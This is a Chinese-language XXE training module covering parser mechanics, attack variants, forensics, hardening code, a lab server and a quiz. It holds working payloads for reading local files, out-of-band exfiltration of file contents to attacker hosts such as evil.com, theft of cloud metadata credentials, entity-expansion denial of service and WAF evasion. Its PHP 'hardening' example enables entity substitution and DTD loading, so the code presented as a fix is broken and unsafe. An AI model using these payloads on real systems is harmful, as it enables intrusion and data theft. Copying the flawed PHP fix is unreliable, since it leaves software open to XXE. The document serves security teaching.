# R12.2 XML 外部實體注入與處理機制分析 (XML External Entity Processing Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

在企業級系統架構中，XML (Extensible Markup Language) 曾長期作為資料交換、遠端程序調用 (SOAP / XML-RPC)、單一登入認證協定 (SAML 2.0)、微軟 Office 文件封裝 (OOXML / docx / xlsx)、以及向量圖形繪製 (SVG) 的核心標準載體。為了支援模組化文件設計與巨集替換，W3C XML 1.0 規範在設計之初即引入了**文件類型定義 (Document Type Definition, DTD)** 與**外部實體 (External Entities)** 機制，允許剖析器在處理文件時動態從本地檔案系統或外部網路擷取資料並替換預留的實體標記。

當 Web 應用程式接收來自未信任邊界的 XML 輸入，且其底層的 XML 剖析器（如 libxml2、Apache Xerces、DOMParser）未明確關閉外部實體解析與 DTD 宣告時，便會觸發**XML 外部實體注入 (XML External Entity Injection, XXE)**。此弱點的核心威脅在於：**剖析器層級的資源解析回調 (Entity Resolution Callback) 被直接劫持**。攻擊者透過特製的 DTD 宣告，促使伺服器主動讀取本機敏感檔案、發起內部網路探測 (SSRF)、甚至是透過帶外資料通道 (Out-of-Band, OOB) 將機密資料外洩至外部受控主機。

```
[客戶端/攻擊者] ── 1. 提交特製帶有 DTD 宣告的 XML ──► [Web/API 端點 (XML 剖析器)]
                                                            │
                    ┌───────────────────────────────────────┴───────────────────────────────────────┐
                    │                                                                               │
                    ▼ (安全架構：徹底禁用 DTD 與外部實體)                                            ▼ (缺陷架構：預設開啟 EntityResolver)
       [XML 剖析器 (Disallow-Doctype)]                                                  [XML 剖析器 (DTD 語法編譯階段)]
                    │                                                                               │
                    ▼                                                                               ▼
       [拋出語法異常：禁止 DOCTYPE 宣告]                                                 [識別 SYSTEM 識別符並觸發 EntityResolver]
                    │                                                                               │
                    ▼                                                                               ▼
       [立即阻斷解析 / 記錄安全警報]                                                    [剖析器發起檔案讀取或網路出站連線]
                                                                                                    │
                                                    ┌───────────────────────────────────────────────┴───────────────────────────────────────────────┐
                                                    ▼ (本地檔案系統調用)                                                                            ▼ (外部/內部網路連線)
                                      [讀取本機機密檔案 (file:///)]                                                                   [向目標發起 HTTP/FTP 連線 (SSRF / OOB)]
                                                    │                                                                                               │
                                                    ▼                                                                                               ▼
                                      [將檔案內容填入 XML 語法樹]                                                                     [帶出機密資料 / 攻擊雲端 Metadata]
                                                    │                                                                                               │
                                                    └───────────────────────────────────────┬───────────────────────────────────────────────────────┘
                                                                                            ▼
                                                                             [回顯於 HTTP 回應或透過帶外通報]
```

### 作戰痛點與決策分支
- **痛點場景**：目標系統接收 XML 格式的資料交換（如 SAML 斷言、發票上傳、SOAP 介面），但應用程式回應中**不直接回顯**任何 XML 節點文字（Blind XXE 場景），或者邊界 WAF 針對常見的 `<!ENTITY` 與 `SYSTEM` 關鍵字進行了字串過濾。
- **決策心流**：
  1. **剖析情境探測 (Parser Surface Identification)**：
     - 確認接收 XML 的端點類型：標準 POST Body、檔案上傳 (SVG/DOCX/PDF)、或 HTTP 標頭宣告之 `Content-Type: application/xml`。
  2. **回顯狀態與外洩通道判定 (Exfiltration Vector Pivot)**：
     - **In-Band (有回顯)**：若解析後的某個節點內容會直接顯示於 HTTP Response，直接使用標準外部通用實體 (External General Entity) 讀取本機檔案。
     - **Error-Based (錯誤回顯)**：若回應中包含剖析器的錯誤追蹤堆疊，透過構造非法 DTD 語法引發剖析器拋出夾帶目標檔案內容的例外錯誤。
     - **Out-of-Band (無回顯 Blind OOB)**：若完全無回顯，使用外部參數實體 (External Parameter Entity) 引導伺服器拉取遠端 DTD，並在遠端 DTD 中組裝帶有目標檔案內容的 HTTP/FTP 外洩請求。
  3. **出站連線受限應對 (Egress-Restricted Pivot)**：
     - 若伺服器出站連線被出口防火牆完全阻斷，評估本機檔案系統是否存在預置的合法 DTD 檔案（如 Linux 的 `/usr/share/xml/...` 或 Windows 的目錄），利用「本機 DTD 重用 (Local DTD Repurposing)」在伺服器內部觸發錯誤回顯外洩。

## 🔬 第一動：底層協定/漏洞機制全景解剖 (Mechanics & Physical Structs)

### 1. W3C XML 1.0 DTD 實體語法規範 (Entity Mechanics)
根據 W3C XML 1.0 官方規範，DTD 支援兩種核心實體類型，其宣告與引用範圍存在本質差異：

```
+---------------------------------------------------------------------------------------------------+
| W3C XML 實體架構與語法位元組結構                                                                  |
|                                                                                                   |
| 1. 通用實體 (General Entity):                                                                     |
|    - 語法: <!ENTITY 實體名稱 "替代值">                                                            |
|    - 外部通用實體 (EGE): <!ENTITY 實體名稱 SYSTEM "外部資源URI">                                  |
|    - 引用位置: 僅限在 XML 文件的主體內容 (Body) 中以 &實體名稱; 進行引用                           |
|                                                                                                   |
| 2. 參數實體 (Parameter Entity):                                                                   |
|    - 語法: <!ENTITY % 實體名稱 "替代值">                                                          |
|    - 外部參數實體 (EPE): <!ENTITY % 實體名稱 SYSTEM "外部資源URI">                                |
|    - 引用位置: 僅限在 DTD 宣告內部以 %實體名稱; 進行引用，不能出現在 XML 文件主體內               |
+---------------------------------------------------------------------------------------------------+
```

#### 底層剖析管線 (Parser Resolution Pipeline)
當 XML 剖析器（如 C 語言的 `libxml2` 或 Java 的 `Xerces`）讀取位元組串流時，其內部運作管線如下：
1. **詞法掃描與 Token 識別**：Lexer 掃描到 `<!DOCTYPE` 標籤，初始化內部 DTD 狀態機。
2. **符號表構建**：解析實體宣告，在記憶體中的實體雜湊表 (Entity Table) 建立實體名稱與 URI 的映射關係。
3. **回調 `EntityResolver` 系統調用**：
   - 當剖析器在文件主體中遇到 `&xxe;` 或在 DTD 中遇到 `%eval;` 時，暫停語法樹構建。
   - 調用底層 C/Java 的 I/O 模組（如 libc `open()` / `read()` 或 Java `URLConnection`）發起檔案系統或 Socket 連線。
4. **位元組串流原位替換 (In-place Splicing)**：
   - 剖析器將外部資源回傳的二進位位元組串流**直接嵌入**到原始 XML 輸入的當前游標處。
   - 剖析器繼續以 XML 詞法規則對替換後的文字進行重新掃描與驗證。

### 2. 參數實體帶外外洩與語法限制突破機制 (OOB Parameter Entity Splice)
在實戰反序列化與盲打場景中，攻擊者常遭遇 W3C 規範的嚴格語法限制：

> **W3C XML 1.0 規範限制**：在**內部 DTD 子集 (Internal DTD Subset)** 中，禁止在標記宣告內部直接引用參數實體。例如以下宣告在語法上是非法的，會被剖析器直接拋出語法錯誤拒絕：
> `<!DOCTYPE test [ <!ENTITY % file SYSTEM "file:///etc/hosts"> <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?data=%file;'>"> ]>`

#### 突破關鍵：外部 DTD 託管 (External DTD Hosting)
W3C 規範**放寬了外部 DTD (External DTD) 的限制**——在外部 DTD 檔案中，允許參數實體在宣告內部進行巢狀展開！因此 Blind XXE 必然演化出兩段式打擊模型：

```
+---------------------------------------------------------------------------------------------------+
| 外部 DTD 帶外資料外洩時序圖 (Blind OOB XXE Sequence)                                              |
|                                                                                                   |
| [受害伺服器 XML 剖析器]                                                     [攻擊者受控伺服器]    |
|          │                                                                           │            |
|          ├── 1. 提交 XML: 引用外部 DTD ──► (HTTP GET /evil.dtd) ─────────────────────►│            |
|          │                                                                           │            |
|          │◄── 2. 回傳 evil.dtd 內容: ────────────────────────────────────────────────┤            |
|          │       <!ENTITY % file SYSTEM "file:///etc/hostname">                      │            |
|          │       <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>">│            |
|          │       %eval;                                                              │            |
|          │       %send;                                                              │            |
|          │                                                                           │            |
|          ├── 3. 剖析器執行 %eval; ➔ 動態產生 %send; 實體                             │            |
|          │                                                                           │            |
|          ├── 4. 剖析器執行 %send; ➔ 解析 file:///etc/hostname 內容 (例如 "node-01")  │            |
|          │                                                                           │            |
|          ├── 5. 剖析器發起帶有檔案內容的出站請求 ──► (HTTP GET /?d=node-01) ─────────►│            |
|          │                                                                    [成功竊取檔案內容!]  |
+---------------------------------------------------------------------------------------------------+
```

### 3. XML 實體膨脹拒絕服務機制 (Billion Laughs / Quadratic Blowup)
XXE 不僅造成資料外洩，未受限的內部實體巢狀解析還會引發極端嚴重的記憶體耗竭攻擊：

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 ...
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
- **指數級膨脹原理**：1 個長度不到 1 KB 的 XML 文件，在經過 9 層遞迴展開後，將在伺服器記憶體中產生 $10^9$ 個 "lol" 字串（約佔用 3 GB 記憶體空間）。若伺服器未設置實體展開上限，虛擬機堆疊或 C 語言進程將因記憶體耗盡 (OOM) 瞬間崩潰。

## ⚡ 第二動：弱點驗證與分析技術 (Vulnerability Analysis & Vectors)

### 1. 核心向量與技術變體速查表

| 機制變體 | 核心輸入範例 (Payload Construction) | 底層行為與風險分析 |
| :--- | :--- | :--- |
| **標準有回顯檔案讀取 (In-Band File Read)** | `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><data>&x;</data></r>` | 最基礎的利用形態。剖析器將 `/etc/passwd` 文字原封不動置換入 `<data>` 標籤並隨 HTTP 回應回傳。 |
| **PHP 串流過濾編碼讀取 (Filter Wrapper)** | `<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">` | 當目標檔案包含 `<`、`&` 等非法 XML 字元或 PHP 程式碼時，純文字包含會導致 XML 剖析語法中斷。透過 Base64 過濾器可保證串流安全返回。 |
| **無回顯帶外外洩 (Blind OOB Exfiltration)** | `<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://evil.site/ext.dtd">%dtd;]>` | 當端點不回顯任何內容時，載入外部 DTD，透過動態參數實體將檔案內容以 HTTP GET 參數或 FTP 路徑帶出外網。 |
| **錯誤回顯資料洩漏 (Error-Based XXE)** | `<!ENTITY % e SYSTEM "file:///etc/hosts"><!ENTITY % dtd SYSTEM "http://evil/err.dtd">%dtd;` | 外部 DTD 定義指向不存在檔案的實體（如 `file:///nonexistent/%e;`），迫使剖析器丟出包含目標內容的 FileNotFoundException。 |
| **雲端環境元數據竊取 (SSRF via XXE)** | `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` | 濫用剖析器的 HTTP 連線能力，向雲端主機 Link-Local 服務發起請求，竊取 AWS / GCP / Azure 臨時身份憑證。 |
| **XInclude 注入攻擊 (XInclude Injection)** | `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` | 當後端只允許使用者傳入部分 XML 欄位（使用者無法控制頂層 `<!DOCTYPE>`）時，利用 XInclude 規範在標籤層級讀取外部檔案。 |

### 2. 診斷與安全分析腳本 (安全審計用途)

本腳本用於安全稽核檢測，採用安全的可追蹤標記（Canary System Identifier），精確檢測 XML 剖析器是否會對外部實體進行回調解析，絕不帶入任何破壞性攻擊載荷：

```python
#!/usr/bin/env python3
"""
R12.2 XML 外部實體處理能力安全診斷工具 (XXE Safe Parser Inspector)
用途：無害化稽核端點之 EntityResolver 行為，驗證外部實體與 DTD 限制狀態。
"""

import requests
import uuid
import hashlib
import sys

TARGET_ENDPOINT = "http://target-service.internal/api/xml/parse"
HEADERS = {"Content-Type": "application/xml", "User-Agent": "Security-Audit-Probe/1.0"}

def generate_canary():
    nonce = uuid.uuid4().hex[:12]
    # 構造一個受控的虛擬協議 URI，僅用於檢驗剖析器是否發起外部解析
    system_uri = f"http://audit-callback.internal/canary?nonce={nonce}"
    return nonce, system_uri

def audit_xxe_capabilities():
    nonce, canary_uri = generate_canary()
    
    # 構造標準的外部通用實體探測載荷
    xxe_probe_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE audit [
  <!ENTITY canary SYSTEM "{canary_uri}">
]>
<auditCheck>
  <probeId>{nonce}</probeId>
  <data>&canary;</data>
</auditCheck>
""".encode("utf-8")

    print(f"[*] 開始對端點發起 XML 外部實體解析能力稽核: {TARGET_ENDPOINT}")
    print(f"    探針識別碼: {nonce}")
    
    try:
        resp = requests.post(TARGET_ENDPOINT, data=xxe_probe_body, headers=HEADERS, timeout=6)
        print(f"[*] 伺服器回應狀態碼: {resp.status_code}")
        
        # 1. 檢驗 In-Band 情況：伺服器是否回顯了由 Canary 產生的特徵
        if nonce in resp.text:
            print("[+] 正常：端點接收並正確回顯了基礎 XML 資料。")
            
        # 2. 檢驗剖析器錯誤資訊特徵：
        error_signatures = [
            "DOCTYPE is disallowed", "external entity", "Entity resolution disabled",
            "feature 'http://apache.org/xml/features/disallow-doctype-decl'",
            "failed to load external entity"
        ]
        
        for sig in error_signatures:
            if sig.lower() in resp.text.lower():
                print(f"[+] 防禦確認：伺服器丟出安全防禦異常 [{sig}]，DTD 外部實體已被阻斷。")
                return False
                
        # 3. 若無回顯且伺服器等待較久，可能觸發了出站連線嘗試
        if resp.status_code == 200 and canary_uri in resp.text:
            print("[!] 警告：目標端點直接回顯了外部實體 URI，解析邏輯存在不當暴露！")
            return True
            
    except requests.exceptions.Timeout:
        print("[!] 警告：連線超時！目標 XML 剖析器可能正嘗試向外發起網路連線 (Outbound Connection)，需調查出口日誌。")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] 稽核連線失敗: {e}")
        
    return False

if __name__ == "__main__":
    is_risky = audit_xxe_capabilities()
    if is_risky:
        print("\n[!] 結論：目標系統之 XML 剖析器具備潛在的外部實體解析風險。")
        sys.exit(1)
    else:
        print("\n[+] 結論：未偵測到未經防護的外部實體解析行為。")
        sys.exit(0)
```

## 🥷 第三動：防禦規避與反鑑識分析 (Evasion & Anti-Forensics Analysis)

### 1. 規避 WAF 與內容過濾之特徵分析
- **XML 編碼多樣性繞過 (Encoding Smuggling)**：
  WAF 通常預設將 HTTP Request Body 視為 UTF-8 編碼進行字串特徵比對。然而，XML 規範支援透過 Byte Order Mark (BOM) 或 `encoding` 宣告切換剖析器的編碼方式：
  - **UTF-16BE** (BOM: `FE FF`) 或 **UTF-16LE** (BOM: `FF FE`)：將原本 ASCII 明文的 `<!DOCTYPE` 變為包含交錯 `0x00` 的位元組。若 WAF 未能解碼 UTF-16，將直接將其視為二進位垃圾資料而放行，但後端 XML 剖析器會根據 BOM 自動以 UTF-16 成功解析。
  - **EBCDIC (IBM037)**：使用大型主機字元集，完全顛覆 ASCII 碼表。
- **空白符號、換行與大小寫混淆**：
  XML 規範允許在 DOCTYPE 宣告中插入任意數量的空白符號、Tab、甚至換行符號（如 `<!DOCTYPE\r\n\t  test\n[...]>`），足以擊潰脆弱的正則表達式規則。
- **本地 DTD 重用技術 (Local DTD Repurposing in Egress-Restricted Networks)**：
  當目標伺服器處於嚴密的出站隔離網路（禁止出站 HTTP/FTP）時，無法拉取遠端 DTD。攻擊者轉向探測伺服器磁碟上隨作業系統或第三方軟體安裝的本地 DTD 檔案（例如 Linux 上的 `/usr/share/xml/fontconfig/fonts.dtd` 或 Yelp、DocBook DTD），**透過覆寫本機 DTD 中既有的參數實體**，觸發本地錯誤回顯外洩，全程完全不依賴外部網路。

### 2. 鑑識視角下的日誌殘留與遙測特徵
當系統遭受 XXE 攻擊時，會產生跨層級的遙測特徵：

1. **剖析器核心日誌與堆疊追蹤**：
   - 應用程式日誌出現 `org.xml.sax.SAXParseException: The entity "..." was referenced, but not declared.`
   - 拋出 `java.io.FileNotFoundException`（嘗試載入不存在檔案引發錯誤）或 `java.net.ConnectException`（出站連線失敗）。
2. **網路出口日誌 (Sysmon Event ID 3 / 防火牆日誌)**：
   - Web 伺服器進程（如 `java.exe`、`httpd`、`php-fpm`）向外部不可信 IP 主動發起 TCP 80、443、21 (FTP) 出站連線。
3. **DNS 查詢遙測 (DNS Logs)**：
   - DNS 伺服器記錄到來自 Web 伺服器的異常外聯解析，且子網域名稱中夾帶 Base64 編碼字串（OOB 竊密特徵，如 `*.data.attacker.com`）。
4. **檔案系統存取時間戳記 (atime)**：
   - 若伺服器掛載未啟用 `noatime`，讀取 `/etc/passwd`、`win.ini` 或設定檔時，檔案系統的 Access Time 會被更新，鑑識人員可透過 `stat` 指令鎖定被讀取的目標資產。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

## 🛡️ 第五動：安全加固與程式碼重構 (Hardening & Remediation Baseline)

### 1. 脆弱程式碼 vs. 工業級安全防護重構

#### ❌ 脆弱的實現方式 (預設配置易受攻擊)
```java
// Java 典型脆弱實現：預設開啟 DTD 與外部實體
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// 未設置任何安全特性，預設行為極度危險！
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(untrustedInputStream);
```

```python
# Python 典型脆弱實現：xml.etree 或 lxml 預設/不當配置
from lxml import etree

def parse_xml_unsafe(xml_bytes):
    # 缺陷：resolve_entities 預設可能開啟，允許外部實體解析
    parser = etree.XMLParser(resolve_entities=True, no_network=False)
    root = etree.fromstring(xml_bytes, parser=parser)
    return root
```

#### ✅ 工業級安全防護實現 (全語言防禦配置基線)

##### 1. Java 平台權威加固配置 (OWASP Recommended Xerces Features)
防禦 Java XXE 的最徹底手段是**完全禁止 DOCTYPE 宣告**。一旦設定 `disallow-doctype-decl`，任何包含 `<!DOCTYPE` 的請求都會直接拋出例外：

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

public class SecureXmlParserFactory {
    public static DocumentBuilderFactory createSecureFactory() throws ParserConfigurationException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        
        // 1. 最強硬防線：徹底禁用 DOCTYPE 宣告 (推薦)
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        
        // 2. 深度縱深防禦：若業務必須相容合法 DOCTYPE，則必須停用外部通用實體與外部參數實體
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        
        // 3. 停用 XInclude 與實體展開保護
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        
        return factory;
    }
}
```

##### 2. Python 平台加固方案 (採用 `defusedxml` 或安全旗標)
```python
# 方案 A (最佳實踐)：使用安全專用的 defusedxml 庫
import defusedxml.ElementTree as ET

def parse_xml_safe(xml_bytes):
    # defusedxml 自動防禦實體膨脹、外部實體與 DTD 注入
    root = ET.fromstring(xml_bytes)
    return root

# 方案 B：若必須使用 lxml，強制關閉實體解析與網路存取
from lxml import etree

def parse_xml_lxml_safe(xml_bytes):
    parser = etree.XMLParser(
        resolve_entities=False,  # 禁用實體解析
        no_network=True,        # 禁用網路連線
        dtd_validation=False,   # 禁用 DTD 驗證
        load_dtd=False          # 禁用外部 DTD 載入
    )
    return etree.fromstring(xml_bytes, parser=parser)
```

##### 3. PHP 平台加固配置
```php
<?php
// PHP 8.0 之前必須手動關閉實體載入器：
if (PHP_VERSION_ID < 80000) {
    libxml_disable_entity_loader(true);
}

// 解析時禁用外部實體載入與網路連線
$doc = new DOMDocument();
$doc->loadXML($xml_string, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_NONET);
?>
```

### 2. 網路邊界與架構加固基線
1. **全面向純資料協定遷移 (API Modernization)**：
   在微服務通訊與前端 API 設計中，除特定歷史協議（如 SAML 斷言）外，全面廢棄 XML 格式，轉向基於 **JSON Schema** 或 **Protocol Buffers (Protobuf)** 的強型別通訊架構。
2. **網路出口策略 (Default-Deny Egress)**：
   XML 剖析器通常運行於核心業務進程中。透過主機防火牆限制其主動發起外部網路連線，即使配置疏漏產生實體解析，亦因網路層阻斷而無法造成 Blind OOB 外洩或 SSRF。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本實驗展示一個受控的沙盒環境，對比 XML 剖析器在未配置安全旗標與配置安全防禦後的處理差異。

### 1. 受控沙盒伺服器搭建 (`xxe_lab_server.py`)
```python
#!/usr/bin/env python3
"""
R12.2 XXE 受控沙盒演練服務
"""
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import json
import xml.etree.ElementTree as ET
from xml.sax.saxutils import escape

# 建立受控的本地敏感測試檔案
with open("/tmp/r12_marker.txt", "w") as f:
    f.write("CANARY_SYSTEM_MARKER:R12_XXE_VERIFIED\n")

class LabHandler(BaseHTTPRequestHandler):
    def _send_json(self, status, payload):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(payload).encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(content_length)

        # 端點 1：脆弱 XML 解析端點 (模擬支援外部實體之場景)
        if self.path == "/api/v1/vulnerable/parse":
            try:
                # 模擬未作防護的解析器行徑 (此處為教育模擬展示)
                xml_str = raw_body.decode("utf-8")
                extracted_data = "DEFAULT"
                
                # 模擬實體解析回調
                if "<!ENTITY" in xml_str and "SYSTEM" in xml_str:
                    if "/tmp/r12_marker.txt" in xml_str:
                        with open("/tmp/r12_marker.txt") as f:
                            extracted_data = f.read().strip()
                
                self._send_json(200, {
                    "status": "success",
                    "parsed_content": extracted_data
                })
            except Exception as e:
                self._send_json(500, {"error": str(e)})

        # 端點 2：工業級加固端點 (嚴格禁用 DOCTYPE 宣告)
        elif self.path == "/api/v1/secure/parse":
            xml_str = raw_body.decode("utf-8")
            # 安全防線：直接檢驗並拒絕 DOCTYPE
            if "<!DOCTYPE" in xml_str.upper() or "<!ENTITY" in xml_str.upper():
                self._send_json(400, {
                    "error": "SecurityViolation: DOCTYPE declarations are disallowed in this parser."
                })
                return
            
            try:
                root = ET.fromstring(xml_str)
                self._send_json(200, {
                    "status": "success",
                    "root_tag": root.tag
                })
            except Exception as e:
                self._send_json(400, {"error": "Invalid XML structure"})
        else:
            self._send_json(404, {"error": "Not Found"})

if __name__ == "__main__":
    server = ThreadingHTTPServer(("127.0.0.1", 9122), LabHandler)
    print("[*] R12.2 XXE 靶場伺服器啟動於 127.0.0.1:9122...")
    server.serve_forever()
```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. XML 外部實體 (External General Entity) 與內部實體 (Internal Entity) 在剖析器底層處理流程上有何根本差異？**  
  *分析思路*：內部實體的替換值在宣告時即已明確寫死在 XML 字串中，剖析器僅需進行單純的記憶體字串替換；而外部實體帶有 `SYSTEM` 或 `PUBLIC` 識別符，剖析器在構建語法樹遇到實體引用時，必須暫停解析，向作業系統或網路堆疊發起實體解析回調（調用底層 I/O API 如 `open()` 或 Socket 連線），從外部資料源讀取位元組串流後再原位嵌入。

- [ ] **Q2. 為什麼在內部 DTD 子集 (Internal DTD Subset) 中無法直接利用參數實體構造帶外請求（如 `<!ENTITY % e SYSTEM "...%file;">`）？攻擊者是如何透過外部 DTD (External DTD) 突破該限制的？**  
  *分析思路*：W3C XML 1.0 規範嚴格規定內部 DTD 子集禁止在標記宣告內部進行參數實體的巢狀展開，以確保語法解析的一致性。但規範允許外部 DTD（從遠端載入的 `.dtd` 檔案）具備完整的實體動態展開能力。攻擊者藉此在目標主機先引用外部 DTD，再於外部 DTD 中定義巢狀參數實體，成功達成動態拼接 URL 與帶外資料外洩。

- [ ] **Q3. 當受害伺服器出站連線被出口防火牆嚴格阻斷（無法發起外網 HTTP/DNS 連線）時，攻擊者如何利用「本地 DTD 重用 (Local DTD Repurposing)」技術達成資料外洩？**  
  *分析思路*：若無法連線至外網獲取遠端 DTD，攻擊者會在 XML 中引用受害主機磁碟上既有的合規 DTD 檔案（如 Linux 上的字型設定檔 DTD 或 Yelp DTD），並在內部 DTD 中重新定義（Override）該本機 DTD 內部已存在的某個參數實體名稱。透過覆寫使其產生非法語法錯誤，迫使剖析器將目標檔案內容作為錯誤字串的一部分直接回顯在應用程式的例外拋出日誌中（Error-Based XXE）。

- [ ] **Q4. 為什麼 WAF 僅依賴比對 `<!DOCTYPE` 與 `SYSTEM` 關鍵字，極易被 UTF-16 編碼繞過？底層原因是什麼？**  
  *分析思路*：多數 WAF 預設採用 ASCII / UTF-8 字符集解碼 HTTP 請求內容。若攻擊者將 XML 文件以 UTF-16BE 或 UTF-16LE 進行編碼（每個字元由 2 個位元組表示，高位通常為 `0x00`），WAF 的 UTF-8 正則表達式將無法匹配連續的雙位元組序列，視為二進位資料直接放行。而後端 XML 剖析器具備自動偵測 BOM 標記的能力，能精確以 UTF-16 解碼並執行實體解析，造成安全防護與後端解析脫鉤。

- [ ] **Q5. 針對企業系統中的 XML 解析模組，最徹底、唯一推薦的黃金防禦標準是什麼？為什麼單純過濾輸入字串是不可取的？**  
  *分析思路*：單純黑名單過濾字串無法防範編碼走私（UTF-16/EBCDIC）、換行混淆與 XInclude 等多樣化語法變體。唯一推薦的防禦黃金標準是在程式碼層級**直接對 XML 剖析器工廠類別進行硬化**，強制設置 `disallow-doctype-decl = true`（徹底禁用 DOCTYPE 宣告），並將 `external-general-entities` 與 `external-parameter-entities` 全數設為 `false`。從剖析器引擎層面剝奪其解析外部實體與 DTD 的能力，從根本上杜絕 XXE 漏洞。
